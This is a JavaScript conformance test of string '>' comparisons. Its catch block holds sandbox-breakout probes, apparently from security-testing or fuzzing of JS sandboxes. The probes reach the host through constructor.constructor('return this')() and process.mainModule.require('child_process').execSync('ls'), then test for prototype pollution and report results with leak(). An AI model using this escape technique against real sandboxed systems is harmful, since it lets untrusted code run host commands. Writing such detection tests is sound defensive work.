try {
    if ('x' > '0' !== true) {
        $ERROR('#1: ("x" > "0") !== true');
    }
    if ('0' > '-' !== true) {
        $ERROR('#2: ("0" > "-") !== true');
    }
    if ('0' > '.' !== true) {
        $ERROR('#3: ("0" > ".") !== true');
    }
    if ('-' > '+' !== true) {
        $ERROR('#4: ("-" > "+") !== true');
    }
    if ('-1' > '-0' !== true) {
        $ERROR('#5: ("-1" > "-0") !== true');
    }
    if ('-1' > '+1' !== true) {
        $ERROR('#6: ("-1" > "+1") !== true');
    }
    if ('1e-10' > '1' !== true) {
        $ERROR('#7: ("1e-10" > "1") !== true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}